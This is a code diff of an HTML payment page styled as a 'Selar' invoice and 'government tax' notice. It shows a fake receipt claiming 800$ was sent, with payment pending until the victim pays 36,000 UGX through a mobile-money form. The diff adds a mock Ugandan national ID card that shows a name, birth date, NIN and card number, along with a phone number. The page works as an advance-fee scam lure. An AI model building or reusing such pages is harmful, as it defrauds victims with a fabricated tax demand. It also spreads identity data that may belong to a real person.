@@ -72,7 +72,7 @@
 
         .description { color: #666; font-size: 13px; line-height: 1.4; margin: 0 auto 25px; max-width: 90%; }
 
-        /* Receipt Style */
+        /* Thermal Receipt Section (Image 1) */
         .image-receipt-box {
             background-color: #ffffff;
             border: 1px solid #ddd;
@@ -89,52 +89,70 @@
         .receipt-center { text-align: center; font-weight: bold; }
         .red-status { color: #d32f2f; font-weight: bold; text-align: center; display: block; margin-top: 10px; }
 
+        /* National ID Visual Section (Image 2) */
+        .id-card-visual {
+            width: 92%;
+            margin: 20px auto;
+            aspect-ratio: 1.6 / 1;
+            background: linear-gradient(135deg, #f3d7d7 0%, #e2eff1 50%, #f1def1 100%);
+            border-radius: 12px;
+            border: 1px solid #c0c0c0;
+            position: relative;
+            padding: 12px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: left;
+            overflow: hidden;
+            color: #1a2a44;
+        }
+        .id-header-text {
+            text-align: center;
+            font-weight: 700;
+            font-size: 13px;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+            color: #2c3e50;
+        }
+        .id-body {
+            position: relative;
+            z-index: 1;
+            display: grid;
+            grid-template-columns: 75px 1fr 1fr;
+            gap: 2px 10px;
+        }
+        .photo-placeholder {
+            grid-row: 1 / 6;
+            width: 75px;
+            height: 95px;
+            background-color: #ddd;
+            border: 1px solid #bbb;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: #666;
+        }
+        .id-field { margin-bottom: 2px; }
+        .id-label-small { font-size: 7px; color: #555; font-weight: bold; text-transform: uppercase; margin: 0; }
+        .id-val-text { font-size: 10px; font-weight: 800; color: #000; margin: 0; }
+        .flag-icon { width: 25px; position: absolute; top: 10px; left: 12px; }
+        .map-icon { width: 25px; position: absolute; top: 10px; right: 12px; opacity: 0.4; }
+        .signature-area { margin-top: 5px; text-align: center; }
+
+        /* Payment Logic Styles */
         .main-amount { font-size: 34px; font-weight: 800; color: #000; margin-bottom: 5px; }
         .confirm-text { color: #888; font-size: 13px; margin-bottom: 30px; }
-
         .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; position: relative; }
-        
         .input-group { display: flex; border: 1px solid #ddd; border-radius: 12px; padding: 4px; align-items: center; margin-bottom: 15px; background: #fff; }
         .input-group input { border: none; outline: none; flex-grow: 1; font-size: 18px; font-weight: bold; color: #444; padding-left: 10px; width: 40%; }
-        
         .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; white-space: nowrap; transition: 0.3s; }
-        .continue-btn:disabled { background-color: #a0a0a0; cursor: not-allowed; }
-
-        /* Identity Verification Section */
-        .id-verification-card {
-            background: #f8fafc;
-            border: 1px solid #e2e8f0;
-            border-radius: 12px;
-            margin: 20px 15px;
-            padding: 15px;
-            text-align: left;
-        }
-        .id-header {
-            font-size: 11px;
-            font-weight: 800;
-            color: #64748b;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 10px;
-            border-bottom: 1px solid #e2e8f0;
-            padding-bottom: 5px;
-        }
-        .id-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            font-size: 12px;
-        }
-        .id-label { color: #94a3b8; font-size: 10px; margin-bottom: 2px; }
-        .id-value { color: #1e293b; font-weight: 700; }
-
+        
         #processing-notice { display: none; margin-bottom: 15px; padding: 10px; background: #f0fdf4; border-radius: 10px; border: 1px solid #dcfce7; }
         .loading-spinner { border: 2px solid #f3f3f3; border-top: 2px solid #00a651; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
+        
         .footer-labels { display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #777; margin-bottom: 10px; }
-        .footer-secondary { display: flex; justify-content: space-between; font-size: 11px; color: #aaa; margin-top: 10px; }
-
+        .footer-secondary { display: flex; justify-content: space-between; font-size: 11px; color: #aaa; padding: 0 15px 20px; }
         .mtn-mini { border: 1px solid #ffcc00; color: #e6b800; border-radius: 10px; padding: 0 6px; font-weight: bold; font-size: 9px; margin-right: 5px; }
         .airtel-mini { color: #ff0000; font-weight: bold; font-size: 11px; display: flex; align-items: center; }
     </style>
@@ -143,7 +161,6 @@
 
 <div class="invoice-card">
     <div class="country-badge"><span class="status-dot"></span> GOVERNMENT TAX</div>
-
     <div class="logo-circle">Selar</div>
 
     <div class="title-row">
@@ -159,26 +176,63 @@
     <p class="description">You are paying government tax for selar-invoice-800usd securely. Payments are protected and your details stay private.</p>
 
     <div class="image-receipt-box">
-        <div class="receipt-center" style="font-size: 16px;">SELAR INVOICE<br>TRANSACTION - RECEIPT</div>
+        <div class="receipt-center" style="font-size: 15px;">SELAR INVOICE<br>TRANSACTION - RECEIPT</div>
         <div class="receipt-center">******************************************</div>
-        
         <div class="receipt-line"><strong>Transaction Type:</strong> Send Money (Mobile)</div>
         <div class="receipt-line"><strong>Account Number:</strong> [Your Seller Involem Account Number]</div>
         <div class="receipt-line"><strong>Name:</strong> Lolikishee USA Chicago</div>
-        
-        <div class="receipt-line" style="margin-top: 15px;"><strong>Recipient DetailID:</strong> SI001234595</div>
+        <div class="receipt-line" style="margin-top: 10px;"><strong>Recipient DetailID:</strong> SI001234595</div>
         <div class="receipt-bold">ALI MOHAMMED</div>
         <div class="receipt-line"><strong>Mobile Number:</strong> +256791418298</div>
         <div class="receipt-line"><strong>Network:</strong> Airtel Uganda</div>
-        
-        <div class="receipt-line" style="margin-top: 15px;"><strong>Amount Sent</strong></div>
-        <div class="receipt-bold">Amount Sent: 800$</div>
-        
-        <div class="receipt-center" style="margin-top: 10px;">------------------------------------------</div>
+        <div class="receipt-line" style="margin-top: 10px;"><strong>Amount Sent Sent:</strong> 800$</div>
+        <div class="receipt-center">------------------------------------------</div>
         <div class="receipt-center">NATIONAL ID VERIFIED FOR RECEIVER</div>
         <div class="red-status">[PENDING: NOT PAID GOVERNMENT TAX OF 36,000 UGX]</div>
-        
-        <div class="receipt-center" style="font-family: sans-serif; font-size: 26px; margin-top: 20px; font-weight: 900; letter-spacing: 2px;">SELAR</div>
+        <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 15px; font-weight: 900;">SELAR</div>
+    </div>
+
+    <div class="id-card-visual">
+        <div class="id-header-text">REPUBLIC OF UGANDA<br>NATIONAL ID CARD</div>
+        <div class="id-body">
+            <div class="photo-placeholder">PHOTO</div>
+            <div class="id-field" style="grid-column: 2 / 4;">
+                <p class="id-label-small">SURNAME</p>
+                <p class="id-val-text">MOHAMMED</p>
+            </div>
+            <div class="id-field" style="grid-column: 2 / 4;">
+                <p class="id-label-small">GIVEN NAME</p>
+                <p class="id-val-text">ALI</p>
+            </div>
+            <div class="id-field">
+                <p class="id-label-small">NATIONALITY</p>
+                <p class="id-val-text">UGA</p>
+            </div>
+            <div class="id-field">
+                <p class="id-label-small">SEX</p>
+                <p class="id-val-text">M</p>
+            </div>
+            <div class="id-field">
+                <p class="id-label-small">DATE OF BIRTH</p>
+                <p class="id-val-text">20.12.1991</p>
+            </div>
+            <div class="id-field" style="grid-column: 2;">
+                <p class="id-label-small">NIN</p>
+                <p class="id-val-text">CM9102210441NJ</p>
+            </div>
+            <div class="id-field" style="grid-column: 3;">
+                <p class="id-label-small">CARD NO.</p>
+                <p class="id-val-text">020660881</p>
+            </div>
+            <div class="id-field" style="grid-column: 2;">
+                <p class="id-label-small">DATE OF EXPIRY</p>
+                <p class="id-val-text">01.09.2030</p>
+            </div>
+        </div>
+        <div class="signature-area">
+            <p class="id-label-small">HOLDERS SIGNATURE</p>
+            <div style="font-family: cursive; font-size: 12px; margin-top: -3px;">Ali Mohammed</div>
+        </div>
     </div>
 
     <div class="main-amount">UGX 36,000</div>
@@ -194,16 +248,10 @@
 
         <form id="paymentForm">
             <input type="hidden" name="ownerid" value="wasswa.lawrence" />
-            <input type="hidden" name="description" value="Credit Note" />
-            <input type="hidden" name="return" value="https://my.jpesa.com" />
-            <input type="hidden" name="cancel" value="https://my.jpesa.com" />
-            <input type="hidden" name="email" value="lolikishee1@gmail.com" />
-            <input type="hidden" name="name" value="loli kishee" />
             <input type="hidden" name="cur" value="UGX" />
             <input type="hidden" name="amount" value="36000" />
-
             <div class="input-group">
-                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" title="Please enter a valid 10-digit phone number" />
+                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" />
                 <button type="submit" id="submitBtn" class="continue-btn">Continue</button>
             </div>
         </form>
@@ -217,41 +265,7 @@
         </div>
     </div>
 
-    <div class="id-verification-card">
-        <div class="id-header">Verified Receiver Identity</div>
-        <div class="id-grid">
-            <div>
-                <div class="id-label">SURNAME</div>
-                <div class="id-value">MOHAMMED</div>
-            </div>
-            <div>
-                <div class="id-label">GIVEN NAME</div>
-                <div class="id-value">ALI</div>
-            </div>
-            <div>
-                <div class="id-label">NATIONALITY / SEX</div>
-                <div class="id-value">UGA / M</div>
-            </div>
-            <div>
-                <div class="id-label">DATE OF BIRTH</div>
-                <div class="id-value">20.12.1991</div>
-            </div>
-            <div>
-                <div class="id-label">NIN</div>
-                <div class="id-value">CM9102210441NJ</div>
-            </div>
-            <div>
-                <div class="id-label">CARD NO.</div>
-                <div class="id-value">020660881</div>
-            </div>
-            <div>
-                <div class="id-label">DATE OF EXPIRY</div>
-                <div class="id-value">01.09.2030</div>
-            </div>
-        </div>
-    </div>
-
-    <div class="footer-secondary" style="padding: 0 15px 20px;">
+    <div class="footer-secondary">
         <span>© 2026 Selar invoice system</span>
         <span>256-bit SSL ● Secure</span>
     </div>
